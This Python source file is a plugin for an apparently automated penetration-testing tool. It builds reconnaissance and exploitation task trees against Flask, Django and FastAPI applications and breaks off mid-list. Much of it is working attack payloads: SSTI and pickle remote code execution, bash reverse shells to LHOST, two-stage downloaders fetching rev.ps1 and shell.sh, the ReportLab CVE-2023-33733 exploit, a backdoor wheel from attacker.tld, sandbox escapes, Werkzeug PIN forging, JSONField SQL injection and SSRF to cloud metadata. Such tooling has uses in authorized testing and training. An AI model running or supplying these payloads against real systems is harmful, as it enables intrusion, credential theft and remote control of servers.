"""
Python Web Framework Exploitation service plugin

Generates tasks for Python web application exploitation including:
- Django/Flask/FastAPI framework-specific attacks
- Server-Side Template Injection (SSTI) in Jinja2/Django templates
- Flask/Werkzeug debug console exploitation & PIN bypass
- Django JSONField SQL injection (CVE-2024-42005)
- Django log injection (CVE-2025-48432)
- Flask SSRF via @ proxy bypass
- Werkzeug Unicode CL.0 request smuggling
- Python sandbox bypass techniques
- Class pollution (Python's prototype pollution)
- Deserialization attacks (pickle, Keras, ML models)
- PyScript exploitation (XSS, SSRF, file exfil)
- Flask SECRET_KEY extraction & session forging
- ReportLab/xhtml2pdf expression evaluation RCE (CVE-2023-33733)
- Python format string exploitation
- ML model deserialization (Keras/PyTorch/TensorFlow)

Extracted from HackTricks Python exploitation content (Django, Flask, Werkzeug, Python)
Generated by: CrackPot v1.0
Enhanced: 2025-10-07 with latest CVEs
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class PythonWebPlugin(ServicePlugin):
    """Python web application exploitation plugin"""

    @property
    def name(self) -> str:
        return "python-web"

    @property
    def default_ports(self) -> List[int]:
        return [5000, 8000, 8080, 8443, 5001, 8001]  # Common Python web framework ports

    @property
    def service_names(self) -> List[str]:
        return ['http', 'https', 'http-proxy', 'http-alt', 'ssl/http']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """Detect Python web frameworks (Flask, Django, FastAPI, etc.)"""
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()
        version = port_info.get('version', '').lower()
        port = port_info.get('port')

        # Check for Python framework indicators
        python_indicators = [
            'werkzeug', 'flask', 'django', 'fastapi',
            'pyramid', 'bottle', 'tornado', 'cherrypy',
            'python', 'wsgi', 'gunicorn', 'uvicorn'
        ]

        if any(indicator in product for indicator in python_indicators):
            return True

        if any(indicator in version for indicator in python_indicators):
            return True

        # Check common Python web ports (only as fallback)
        # Only return True if other HTTP detection already matched
        if port in self.default_ports and 'http' in service:
            return False  # Let HTTP plugin handle unless Python framework detected

        return False


    def detect_from_finding(self, finding: Dict[str, Any], profile=None) -> int:
        """Detect Python web frameworks (Django, Flask, FastAPI)"""
        from ..core.constants import FindingTypes
        import logging
        logger = logging.getLogger(__name__)

        finding_type = finding.get('type', '').lower()
        description = finding.get('description', '').lower()

        # Perfect match - Python web frameworks detected
        python_frameworks = [FindingTypes.FRAMEWORK_DJANGO, FindingTypes.FRAMEWORK_FLASK,
                             FindingTypes.TECH_PYTHON]
        if finding_type in python_frameworks:
            logger.info(f"Python web plugin activating: {finding_type} detected")
            return 100

        # High confidence - Python framework indicators
        python_indicators = ['django', 'flask', 'fastapi', 'werkzeug',
                             'pyramid', 'bottle', 'tornado', 'gunicorn', 'uvicorn']
        if any(ind in description for ind in python_indicators):
            logger.info(f"Python web plugin activating: Found '{description[:50]}'")
            return 90

        return 0

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Python web exploitation task tree"""
        version = service_info.get('version', '')
        product = service_info.get('product', '')
        is_https = port in [443, 8443, 5001] or 'https' in service_info.get('service', '').lower()
        protocol = 'https' if is_https else 'http'
        url = f"{protocol}://{target}:{port}"

        # Detect specific framework
        framework = 'unknown'
        if 'flask' in product.lower() or 'werkzeug' in product.lower():
            framework = 'flask'
        elif 'django' in product.lower():
            framework = 'django'
        elif 'fastapi' in product.lower() or 'uvicorn' in product.lower():
            framework = 'fastapi'

        tasks = {
            'id': f'python-web-enum-{port}',
            'name': f'Python Web Exploitation (Port {port})',
            'type': 'parent',
            'children': []
        }

        # RECON PHASE
        recon_parent = {
            'id': f'python-recon-{port}',
            'name': 'Python Framework Reconnaissance',
            'type': 'parent',
            'children': []
        }

        # 1. Framework detection
        recon_parent['children'].append({
            'id': f'python-detect-{port}',
            'name': 'Python Framework Detection',
            'type': 'command',
            'metadata': {
                'command': f'whatweb {url} -v',
                'description': 'Identify Python framework, version, and debug mode indicators',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'RECON'],
                'flag_explanations': {
                    '-v': 'Verbose output (shows all detected technologies including Python frameworks)',
                    url: 'Target URL to fingerprint'
                },
                'success_indicators': [
                    'Flask/Werkzeug version detected',
                    'Django version detected',
                    'Debug mode enabled (high value target)',
                    'Python version revealed in headers'
                ],
                'failure_indicators': [
                    'No Python framework detected',
                    'Generic HTTP server response',
                    'Framework version hidden'
                ],
                'next_steps': [
                    'Check for debug mode: Look for Werkzeug debugger at /console',
                    'Check for error pages that reveal Python tracebacks',
                    'Test for common Python paths: /admin, /api, /docs, /swagger',
                    'Look for SSTI indicators in input fields'
                ],
                'alternatives': [
                    f'curl -I {url} (check Server and X-Powered-By headers)',
                    f'curl {url} (look for framework-specific error pages)',
                    f'Browser: Visit {url} and trigger 404 to see error page',
                    f'nmap --script http-headers -p {port} {target}'
                ],
                'notes': 'Flask debug mode with PIN bypass = instant RCE. Django debug mode leaks settings.',
                'estimated_time': '2-3 minutes'
            }
        })

        # 2. Werkzeug console detection (Flask-specific)
        if framework == 'flask' or framework == 'unknown':
            recon_parent['children'].append({
                'id': f'werkzeug-console-{port}',
                'name': 'Werkzeug Debug Console Detection',
                'type': 'command',
                'metadata': {
                    'command': f'curl -i {url}/console',
                    'description': 'Check if Werkzeug debugger console is accessible (instant RCE if open)',
                    'tags': ['OSCP:HIGH', 'QUICK_WIN', 'EXPLOIT'],
                    'flag_explanations': {
                        '-i': 'Include HTTP headers in output',
                        '/console': 'Werkzeug debugger interactive console endpoint'
                    },
                    'success_indicators': [
                        'Werkzeug Debugger interface appears',
                        'Python prompt available',
                        'PIN not required (rare but game over)',
                        'Error reveals machine-id or uuid (needed for PIN generation)'
                    ],
                    'failure_indicators': [
                        '404 Not Found (debug mode disabled)',
                        'PIN required and unknown',
                        'Debug mode completely disabled'
                    ],
                    'next_steps': [
                        'If open: Execute commands directly via Python console',
                        'If PIN-protected: Generate PIN via machine-id + uuid leak',
                        'Trigger errors to leak machine-id from traceback',
                        'Look for LFI to read /etc/machine-id and get_uuid'
                    ],
                    'alternatives': [
                        f'Browser: Visit {url}/console manually',
                        f'Test error pages: {url}/nonexistent to see if debug mode enabled',
                        'Use SSTI to read /etc/machine-id if LFI not available'
                    ],
                    'notes': 'Werkzeug PIN = hash(username + machine-id + MAC address + app path). See HackTricks Werkzeug page.'
                }
            })

        # 3. Error page enumeration
        recon_parent['children'].append({
            'id': f'python-errors-{port}',
            'name': 'Python Error Page Enumeration',
            'type': 'manual',
            'metadata': {
                'description': 'Trigger errors to leak Python internals, file paths, and framework details',
                'tags': ['MANUAL', 'OSCP:HIGH', 'QUICK_WIN'],
                'alternatives': [
                    f'curl {url}/nonexistent (trigger 404)',
                    f'curl -X POST {url}/api/invalid (trigger 500)',
                    f'curl "{url}?param={{{{7*7}}}}" (test SSTI in errors)',
                    f'curl "{url}?param[]]=invalid" (trigger parse errors)',
                    'Submit invalid JSON/XML to API endpoints'
                ],
                'success_indicators': [
                    'Full Python traceback visible',
                    'File system paths leaked',
                    'Environment variables visible',
                    'SECRET_KEY or credentials leaked',
                    'Debug mode confirmed'
                ],
                'next_steps': [
                    'Document all leaked paths and secrets',
                    'Use leaked paths for LFI attempts',
                    'Extract machine-id from traceback for Werkzeug PIN',
                    'Look for import statements revealing installed libraries'
                ],
                'notes': 'Django debug page shows entire settings.py. Flask shows full traceback with locals().'
            }
        })

        tasks['children'].append(recon_parent)

        # EXPLOITATION PHASE
        exploit_parent = {
            'id': f'python-exploit-{port}',
            'name': 'Python Web Exploitation Techniques',
            'type': 'parent',
            'children': []
        }

        # 4. Server-Side Template Injection (SSTI)
        exploit_parent['children'].append({
            'id': f'ssti-test-{port}',
            'name': 'Server-Side Template Injection (SSTI) Testing',
            'type': 'command',
            'metadata': {
                'command': f'curl "{url}/?name={{{{7*7}}}}"',
                'description': 'Test for SSTI by injecting template expressions (Flask/Jinja2, Django)',
                'tags': ['OSCP:HIGH', 'EXPLOIT'],
                'flag_explanations': {
                    '{{7*7}}': 'Jinja2 template expression (should return 49 if vulnerable)',
                    '-G': 'GET request (default)',
                    '--data-urlencode': 'Use for POST data with proper encoding'
                },
                'success_indicators': [
                    'Output shows "49" (7*7 evaluated)',
                    'Template expression executed',
                    'Error reveals template engine',
                    'Different output than "{{7*7}}" literally'
                ],
                'failure_indicators': [
                    'Output shows "{{7*7}}" literally',
                    'Input sanitized or escaped',
                    'No reflection in response',
                    'WAF blocking'
                ],
                'next_steps': [
                    'Map all injection points: URL params, POST data, JSON fields, headers',
                    'Test RCE payload: {{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").read()}}',
                    'Flask secret extraction: {{config.SECRET_KEY}}',
                    'Bypass filters: Use __getitem__ instead of [] if brackets blocked',
                    'Full RCE: {{self.__init__.__globals__.__builtins__.__import__(\"os\").popen(\"bash -c \'bash -i >& /dev/tcp/LHOST/LPORT 0>&1\'\").read()}}'
                ],
                'alternatives': [
                    'Test Django: {{7*7}} or {{7*\"7\"}} or {%debug%}',
                    'Test Tornado: {{7*7}}',
                    'Test Mako: ${7*7}',
                    'URL encode: curl "URL?name=%7B%7B7*7%7D%7D"',
                    'POST injection: curl -X POST -d "name={{7*7}}" URL',
                    'JSON: curl -X POST -H "Content-Type: application/json" -d \'{"name":"{{7*7}}"}\' URL'
                ],
                'notes': 'Common SSTI payloads at PayloadsAllTheThings. Test {{config}} first in Flask to see if context accessible.',
                'estimated_time': '5-10 minutes'
            }
        })

        # 5. Python pickle deserialization
        exploit_parent['children'].append({
            'id': f'pickle-rce-{port}',
            'name': 'Python Pickle Deserialization RCE',
            'type': 'manual',
            'metadata': {
                'description': 'Test for unsafe pickle.loads() via cookies, session data, or API endpoints',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'DESERIALIZATION'],
                'alternatives': [
                    '# Create malicious pickle (Python code):',
                    'import pickle, os, base64',
                    'class RCE: __reduce__ = lambda self: (os.system, ("id",))',
                    'payload = base64.b64encode(pickle.dumps(RCE()))',
                    f'curl -b "session=$payload" {url}',
                    '',
                    '# Or use existing tool:',
                    'python3 -c "import pickle,base64,os; print(base64.b64encode(pickle.dumps(type(\'RCE\',(),{\'__reduce__\':lambda s:(os.system,(\'id\',))})()))))"',
                    '',
                    '# Send in session cookie:',
                    f'curl -H "Cookie: session=BASE64_PAYLOAD" {url}'
                ],
                'success_indicators': [
                    'Command executed (out-of-band DNS/HTTP callback)',
                    'Application behavior changes',
                    'Error reveals unpickling',
                    'Sleep command delays response'
                ],
                'failure_indicators': [
                    'Invalid cookie error',
                    'No deserialization occurring',
                    'Pickle signature detection/blocking'
                ],
                'next_steps': [
                    'If Flask: Target session cookies (usually signed with SECRET_KEY)',
                    'Extract SECRET_KEY via SSTI: {{config.SECRET_KEY}}',
                    'Use flask-unsign to forge cookies: flask-unsign --sign --cookie "..." --secret KEY',
                    'Test other serialization: JSON, YAML, msgpack',
                    'Send reverse shell pickle'
                ],
                'notes': 'Most Python frameworks use pickle for session serialization. If you have SECRET_KEY, full RCE via session.'
            }
        })

        # 6. Class pollution / Prototype pollution
        exploit_parent['children'].append({
            'id': f'class-pollution-{port}',
            'name': 'Class Pollution (Python Prototype Pollution)',
            'type': 'manual',
            'metadata': {
                'description': 'Test for class pollution via recursive merge functions or mass assignment',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                'alternatives': [
                    '# Test with JSON payload:',
                    f'curl -X POST -H "Content-Type: application/json" \\',
                    f'  -d \'{{"__class__": {{"__init__": {{"__globals__": {{"secret": "polluted"}}}}}}}}\' \\',
                    f'  {url}/api/update',
                    '',
                    '# Flask secret pollution:',
                    '{"__class__":{"__init__":{"__globals__":{"app":{"secret_key":"polluted"}}}}}',
                    '',
                    '# Subprocess pollution (Windows):',
                    '{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}',
                    '',
                    '# Test kwdefaults pollution:',
                    '{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"whoami"}}}}}}'
                ],
                'success_indicators': [
                    'Global variables modified',
                    'Application behavior changes',
                    'Secret key replaced',
                    'Default function arguments polluted',
                    'RCE via subprocess environment pollution'
                ],
                'failure_indicators': [
                    'Input validation blocks __class__',
                    'Recursive merge not implemented',
                    'No mass assignment vulnerability'
                ],
                'next_steps': [
                    'Map all JSON/dict merge endpoints',
                    'Test __init__.__globals__ pollution',
                    'Target Flask app.secret_key',
                    'Pollute __kwdefaults__ for functions with keyword-only args',
                    'Chain with SSTI or deserialization'
                ],
                'notes': 'Similar to JavaScript prototype pollution but targets Python class hierarchy. Works when merge() uses setattr().'
            }
        })

        # 7. ReportLab / xhtml2pdf RCE (PDF generation)
        exploit_parent['children'].append({
            'id': f'reportlab-rce-{port}',
            'name': 'ReportLab/xhtml2pdf Expression Evaluation RCE',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit CVE-2023-33733 in PDF generation from HTML (ReportLab <= 3.6.12)',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'CVE'],
                'alternatives': [
                    '# Test for PDF generation feature first:',
                    f'curl {url}/export/pdf or {url}/report/generate',
                    '',
                    '# Minimal RCE payload (ping test):',
                    '<para><font color="[[[getattr(pow, Word(\'__globals__\'))[\'os\'].system(\'ping LHOST\') for Word in [ orgTypeFun( \'Word\', (str,), { \'mutated\': 1, \'startswith\': lambda self, x: 1 == 0, \'__eq__\': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, \'mutate\': lambda self: { setattr(self, \'mutated\', self.mutated - 1) }, \'__hash__\': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and \'red\'">exploit</font></para>',
                    '',
                    '# Windows reverse shell (two-stage):',
                    '# Stage 1 - Download:',
                    'system(\'powershell -c iwr http://LHOST/rev.ps1 -o rev.ps1\')',
                    '# Stage 2 - Execute:',
                    'system(\'powershell ./rev.ps1\')',
                    '',
                    '# Linux reverse shell:',
                    'system(\'curl http://LHOST/shell.sh -o /tmp/s; bash /tmp/s\')'
                ],
                'success_indicators': [
                    'PDF generated with executed command',
                    'Ping received (verify with tcpdump)',
                    'Reverse shell connection',
                    'Out-of-band HTTP request to your server'
                ],
                'failure_indicators': [
                    'No PDF generation feature',
                    'ReportLab version > 3.6.12 (patched)',
                    'Triple bracket [[[]]] stripped',
                    'Expression evaluation disabled'
                ],
                'next_steps': [
                    'Verify with ping/DNS first: sudo tcpdump -ni tun0 icmp',
                    'Set up reverse shell listener: nc -lvnp 4444',
                    'Try different command injection contexts (color, bgcolor, etc)',
                    'Two-stage payload avoids quoting issues',
                    'Check PDF metadata: exiftool output.pdf | grep Producer'
                ],
                'notes': 'Works when user input → HTML → PDF generation. Profile exports, invoices, reports are common targets. CVE-2023-33733.'
            }
        })

        # 8. Keras/ML model deserialization
        exploit_parent['children'].append({
            'id': f'ml-model-rce-{port}',
            'name': 'ML Model Deserialization RCE (Keras/Pickle)',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit unsafe ML model loading (Keras <= 3.8, PyTorch pickle, TensorFlow)',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'ML'],
                'alternatives': [
                    '# Keras RCE via Lambda layer (CVE-2024-3660, CVE-2025-1550):',
                    'import json',
                    'payload = {',
                    '  "module": "keras.layers",',
                    '  "class_name": "Lambda",',
                    '  "config": {',
                    '    "function": {"module": "keras.utils", "class_name": "get_file"},',
                    '    "arguments": {"fname": "shell.sh", "origin": "http://LHOST/shell.sh"}',
                    '  }',
                    '}',
                    '# Upload malicious .keras file',
                    '',
                    '# PyTorch pickle RCE:',
                    'import torch',
                    'class RCE: __reduce__ = lambda s: (__import__(\'os\').system, (\'id\',))',
                    'torch.save(RCE(), "malicious.pt")',
                    '',
                    '# Upload to model endpoint:',
                    f'curl -X POST -F "model=@malicious.pt" {url}/api/model/upload'
                ],
                'success_indicators': [
                    'Model upload accepted',
                    'Command executed on server',
                    'File downloaded from attacker server',
                    'Application loads/trains model'
                ],
                'failure_indicators': [
                    'Model validation rejects payload',
                    'Keras >= 3.9 (allowlist enforced)',
                    'safe_mode=True blocks Lambda',
                    'File type restrictions'
                ],
                'next_steps': [
                    'Map model upload/training endpoints',
                    'Test PyTorch .pt/.pth/.ckpt formats',
                    'Test Keras .keras/.h5 formats',
                    'Test scikit-learn pickle models',
                    'Use Fickling to scan and exploit pickle models',
                    'Chain with path traversal for write-anywhere'
                ],
                'notes': 'AI/ML apps often load user models. PyTorch uses pickle (instant RCE). Keras <=3.8 allows arbitrary imports. Fickling tool helps.'
            }
        })

        # 9. PyScript exploitation
        exploit_parent['children'].append({
            'id': f'pyscript-exploit-{port}',
            'name': 'PyScript Exploitation (Client-Side Python)',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit PyScript vulnerabilities: XSS, file exfil, package loading, SSRF',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'XSS'],
                'alternatives': [
                    '# XSS via print():',
                    '<py-script>',
                    '  print("<img src=x onerror=alert(document.domain)>")',
                    '</py-script>',
                    '',
                    '# File exfiltration (CVE-2022-30286):',
                    '<py-script>',
                    '  with open(\'/lib/python3.10/site-packages/_pyodide/_base.py\') as f:',
                    '    print(f.read())',
                    '</py-script>',
                    '',
                    '# SSRF (CVE-2025-50182 - urllib3 < 2.5.0 in Pyodide):',
                    '<script type="py">',
                    'import urllib3',
                    'http = urllib3.PoolManager(redirect=False)  # bypassed in Pyodide',
                    'r = http.request("GET", "http://internal-service/")',
                    'print(r.data)',
                    '</script>',
                    '',
                    '# Malicious package loading:',
                    '<py-config>',
                    'packages = ["https://attacker.tld/backdoor-0.0.1-py3-none-any.whl"]',
                    '</py-config>',
                    '<script type="py">import backdoor</script>'
                ],
                'success_indicators': [
                    'JavaScript alert fires (XSS)',
                    'File contents exfiltrated',
                    'SSRF callback received',
                    'Malicious package executed'
                ],
                'failure_indicators': [
                    'print() output escaped (display() used instead)',
                    'urllib3 >= 2.5.0 (patched)',
                    'Package sources restricted',
                    'CSP blocks inline scripts'
                ],
                'next_steps': [
                    'Test if print() renders HTML or display() escapes',
                    'Exfil Emscripten filesystem files',
                    'Use SSRF to scan internal network',
                    'Host malicious wheel package for RCE',
                    'Bypass CSP if possible'
                ],
                'notes': 'PyScript runs Python in browser via WebAssembly. Look for user-controlled <py-script> tags or packages list.'
            }
        })

        tasks['children'].append(exploit_parent)

        # POST-EXPLOITATION PHASE
        post_exploit_parent = {
            'id': f'python-post-{port}',
            'name': 'Python Post-Exploitation',
            'type': 'parent',
            'children': []
        }

        # 10. Flask secret key extraction
        if framework == 'flask' or framework == 'unknown':
            post_exploit_parent['children'].append({
                'id': f'flask-secret-{port}',
                'name': 'Flask SECRET_KEY Extraction',
                'type': 'manual',
                'metadata': {
                    'description': 'Extract Flask SECRET_KEY via SSTI, error pages, or class pollution for session forging',
                    'tags': ['OSCP:HIGH', 'POST_EXPLOIT'],
                    'alternatives': [
                        '# Via SSTI:',
                        '{{config.SECRET_KEY}}',
                        '{{config}}  # Shows all config including SECRET_KEY',
                        '{{self.__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key}}',
                        '',
                        '# Via Python gadget chain:',
                        '{{self.__init__.__globals__[\"app\"].secret_key}}',
                        '',
                        '# Via format string (if vulnerable):',
                        '{people_obj.__init__.__globals__[app].secret_key}',
                        '',
                        '# Via class pollution read:',
                        '# Read from another file: __init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key'
                    ],
                    'success_indicators': [
                        'SECRET_KEY value revealed',
                        'Config object dumped',
                        'Can forge valid session cookies'
                    ],
                    'next_steps': [
                        'Use flask-unsign to forge session: pip install flask-unsign',
                        'Decode existing session: flask-unsign --decode --cookie "SESSION"',
                        'Forge admin session: flask-unsign --sign --cookie \'{"user_id": 1, "is_admin": true}\' --secret "EXTRACTED_KEY"',
                        'Inject pickle RCE in session if deserialization used',
                        'Escalate to RCE via session'
                    ],
                    'notes': 'Flask sessions are signed with SECRET_KEY. Once extracted, full account takeover + potential RCE via pickle.'
                }
            })

        # 11. Werkzeug PIN generation
        if framework == 'flask' or framework == 'unknown':
            post_exploit_parent['children'].append({
                'id': f'werkzeug-pin-{port}',
                'name': 'Werkzeug Console PIN Generation',
                'type': 'manual',
                'metadata': {
                    'description': 'Generate Werkzeug debugger PIN from leaked machine-id and uuid for /console access',
                    'tags': ['OSCP:HIGH', 'POST_EXPLOIT'],
                    'alternatives': [
                        '# Extract machine-id via SSTI or LFI:',
                        '{{self.__init__.__globals__[\"sys\"].modules[\"werkzeug.debug\"]._machine_id}}',
                        'curl http://TARGET/../../../../etc/machine-id',
                        '',
                        '# Extract uuid node:',
                        '{{self.__init__.__globals__[\"sys\"].modules[\"werkzeug.debug\"].uuid._node}}',
                        '',
                        '# Generate PIN (Python script):',
                        'import hashlib',
                        'from itertools import chain',
                        'def generate_pin(username, machine_id, mac_address, app_path):',
                        '    h = hashlib.sha1()',
                        '    for bit in chain.from_iterable((username, machine_id, mac_address, app_path)):',
                        '        h.update(str(bit).encode())',
                        '    cookie_name = "__wzd" + h.hexdigest()[:20]',
                        '    num = int(h.hexdigest(), 16)',
                        '    return (f"{num % 100000000:08d}-{num // 100000000 % 1000:03d}-{num // 100000000000:03d}")',
                        '',
                        '# Get values and generate:',
                        'username = "www-data" # or flask app user',
                        'machine_id = "LEAKED_MACHINE_ID"',
                        'mac_address = "LEAKED_MAC" # uuid._node or from /sys/class/net/eth0/address',
                        'app_path = "/usr/local/lib/python3.9/site-packages/flask/app.py"',
                        'print(generate_pin(username, machine_id, mac_address, app_path))'
                    ],
                    'success_indicators': [
                        'Valid PIN generated',
                        '/console access granted',
                        'Python shell available'
                    ],
                    'failure_indicators': [
                        'Invalid PIN',
                        'Missing required values',
                        'Wrong username or path'
                    ],
                    'next_steps': [
                        'Access /console with PIN',
                        'Execute Python commands directly',
                        'Import os and get shell: __import__("os").popen("bash -c \'bash -i >& /dev/tcp/LHOST/LPORT 0>&1\'").read()',
                        'Upgrade to full reverse shell'
                    ],
                    'notes': 'PIN = hash of (username + machine-id + MAC + app_path). Trigger errors to leak machine-id from traceback.'
                }
            })

        # 12. Python sandbox bypass
        post_exploit_parent['children'].append({
            'id': f'python-sandbox-bypass-{port}',
            'name': 'Python Sandbox Bypass Techniques',
            'type': 'manual',
            'metadata': {
                'description': 'Bypass Python sandbox restrictions to achieve RCE',
                'tags': ['OSCP:HIGH', 'POST_EXPLOIT'],
                'alternatives': [
                    '# Access builtins when __builtins__ restricted:',
                    '"".__class__.__base__.__subclasses__()[104].__init__.__globals__["__builtins__"]["__import__"]("os").system("id")',
                    '',
                    '# Find useful subclasses:',
                    '[x.__name__ for x in "".__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]',
                    '',
                    '# Subprocess.Popen for RCE:',
                    '[x for x in "".__class__.__base__.__subclasses__() if x.__name__ == "Popen"][0]("id", shell=True)',
                    '',
                    '# os.system via globals:',
                    '"".__class__.__base__.__subclasses__()[104].__init__.__globals__["os"].system("id")',
                    '',
                    '# When call() blocked, use decorators:',
                    '@exec',
                    '@input',
                    'class X: pass',
                    '',
                    '# Via __getitem__ overload:',
                    'class RCE(Exception):',
                    '    __add__ = exec',
                    'try: raise RCE',
                    'except RCE as k: k + "__import__(\'os\').system(\'id\')"',
                    '',
                    '# Bypass via eval + compile:',
                    'eval(compile("__import__(\'os\').system(\'id\')", "<stdin>", "exec"))',
                    '',
                    '# Read files without open():',
                    '"".__class__.__base__.__subclasses__()[40]("/etc/passwd").read()  # file object at offset 40'
                ],
                'success_indicators': [
                    'Command execution achieved',
                    'Builtins accessed',
                    'Sandbox restrictions bypassed',
                    'File read/write capability'
                ],
                'next_steps': [
                    'Find correct subclass offset for your Python version',
                    'Enumerate loaded modules for dangerous imports',
                    'Chain multiple bypasses if needed',
                    'Get full reverse shell',
                    'Read sensitive files'
                ],
                'notes': 'Python sandbox bypasses rely on accessing __builtins__ through class hierarchy. Offsets vary by Python version.'
            }
        })

        # 13. Python format string exploitation
        post_exploit_parent['children'].append({
            'id': f'python-format-string-{port}',
            'name': 'Python Format String Exploitation',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit .format() vulnerabilities to read internals and achieve RCE',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                'alternatives': [
                    '# Read Flask secret key:',
                    '{people_obj.__init__.__globals__[CONFIG][KEY]}',
                    '',
                    '# Access attributes and dict items:',
                    '{obj.attr}  # attribute access',
                    '{obj[key]}  # dict access (no quotes needed)',
                    '{obj.__dict__}  # enumerate all attributes',
                    '',
                    '# Read sensitive data:',
                    '{whoami.__globals__[os].environ}',
                    '{whoami.__globals__[sys].modules}',
                    '{whoami.__class__.__dict__}',
                    '',
                    '# RCE via ctypes library loading:',
                    '{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/tmp/evil.so]}',
                    '',
                    '# Call str/repr/ascii on objects:',
                    '{obj!s}  # str(obj)',
                    '{obj!r}  # repr(obj)',
                    '{obj!a}  # ascii(obj)',
                    '',
                    '# Example vulnerable code:',
                    'return avatar_str.format(people_obj=people_obj)',
                    '# Exploit:',
                    'avatar_str = "{people_obj.__init__.__globals__[CONFIG][KEY]}"'
                ],
                'success_indicators': [
                    'Internal data leaked',
                    'SECRET_KEY extracted',
                    'Environment variables dumped',
                    'Module imports revealed'
                ],
                'next_steps': [
                    'Map all format string injection points',
                    'Extract Flask/Django secrets',
                    'Access __globals__ of functions',
                    'Read sensitive configuration',
                    'Chain with library loading for RCE if possible'
                ],
                'notes': 'Format strings allow attribute and dict access. Key is finding objects with access to __globals__ or sensitive data.'
            }
        })

        # 14. Django SQL injection in JSONField (CVE-2024-42005)
        if framework == 'django' or framework == 'unknown':
            post_exploit_parent['children'].append({
                'id': f'django-sqli-jsonfield-{port}',
                'name': 'Django JSONField SQL Injection (CVE-2024-42005)',
                'type': 'manual',
                'metadata': {
                    'description': 'Exploit critical SQL injection in QuerySet.values()/values_list() on JSONField (CVSS 9.8)',
                    'tags': ['OSCP:HIGH', 'EXPLOIT', 'CVE', 'SQLI'],
                    'alternatives': [
                        '# Vulnerable Django versions: < 4.2.15 / < 5.0.8',
                        '# JSON key injection to break SQL quoting:',
                        '',
                        '# Basic test payload:',
                        f'curl "{url}/api/search?json_key=key\' OR \'1\'=\'1"',
                        '',
                        '# Exploit QuerySet.values() with JSONField:',
                        '# Vulnerable pattern: Model.objects.values("json_field__key_from_user_input")',
                        '',
                        '# SQL injection via JSON key path:',
                        'json_key = "user_data__\' OR 1=1--"',
                        f'curl -X POST -H "Content-Type: application/json" \\',
                        f'  -d \'{{"filter": "user_data__\' OR 1=1--"}}\' \\',
                        f'  {url}/api/query',
                        '',
                        '# Extract database data:',
                        'json_key = "field__\' UNION SELECT password FROM auth_user--"',
                        '',
                        '# Boolean-based blind SQLi:',
                        'json_key = "field__\' AND (SELECT COUNT(*) FROM auth_user WHERE username=\'admin\')>0--"',
                        '',
                        '# Time-based blind SQLi (PostgreSQL):',
                        'json_key = "field__\' AND (SELECT pg_sleep(5))--"'
                    ],
                    'success_indicators': [
                        'SQL error reveals vulnerable QuerySet',
                        'Database data extracted',
                        'Authentication bypass',
                        'Time delay confirms blind injection',
                        'UNION query returns different data'
                    ],
                    'failure_indicators': [
                        'Django >= 4.2.15 / 5.0.8 (patched)',
                        'No JSONField queries with user input',
                        'Input validation blocks SQL syntax',
                        'WAF detects and blocks injection'
                    ],
                    'next_steps': [
                        'Fingerprint Django version: check /static/admin/css/base.css hash',
                        'Map all API endpoints using values()/values_list()',
                        'Identify JSONField parameters accepting user-controlled keys',
                        'Use sqlmap for automated exploitation: sqlmap -u URL --technique=BEUST',
                        'Extract admin credentials from auth_user table',
                        'Escalate to RCE via Django admin interface'
                    ],
                    'notes': 'CVE-2024-42005 allows breaking out of JSON key quoting. Django < 4.2.15 / 5.0.8 vulnerable. Check for .values("jsonfield__USER_INPUT").'
                }
            })

        # 15. Flask SSRF via @ proxy bypass
        if framework == 'flask' or framework == 'unknown':
            post_exploit_parent['children'].append({
                'id': f'flask-ssrf-at-bypass-{port}',
                'name': 'Flask SSRF via @ Proxy Bypass',
                'type': 'manual',
                'metadata': {
                    'description': 'Exploit Flask HTTP parser allowing @ character for SSRF in proxy scenarios',
                    'tags': ['OSCP:HIGH', 'EXPLOIT', 'SSRF'],
                    'alternatives': [
                        '# Flask accepts requests starting with @ character:',
                        f'curl -i "{url}/@attacker.com/"',
                        '',
                        '# Vulnerable pattern in Flask apps:',
                        '# @app.route("/<path:path>")',
                        '# def proxy(path): return requests.get(f"{SITE_NAME}{path}").content',
                        '',
                        '# SSRF to internal services:',
                        f'curl "{url}/@localhost:8080/admin"',
                        f'curl "{url}/@127.0.0.1:6379/CONFIG%20GET%20dir"  # Redis',
                        f'curl "{url}/@169.254.169.254/latest/meta-data/"  # AWS metadata',
                        '',
                        '# Bypass URL validation:',
                        f'curl "{url}/@evil.com/path"',
                        '',
                        '# Chain with path traversal:',
                        f'curl "{url}/@attacker.com/../../../etc/passwd"',
                        '',
                        '# Test via Burp Suite:',
                        'GET @attacker.com/ HTTP/1.1',
                        f'Host: {target}:{port}',
                        'Connection: close'
                    ],
                    'success_indicators': [
                        'Request redirected to attacker domain',
                        'Internal service response received',
                        'AWS/GCP metadata accessible',
                        'Redis/Memcached command executed',
                        'DNS callback to attacker server'
                    ],
                    'failure_indicators': [
                        'Flask rejects @ in path',
                        'Proxy validation blocks request',
                        'No proxy pattern in application',
                        '400 Bad Request error'
                    ],
                    'next_steps': [
                        'Set up DNS/HTTP callback server: python3 -m http.server 80',
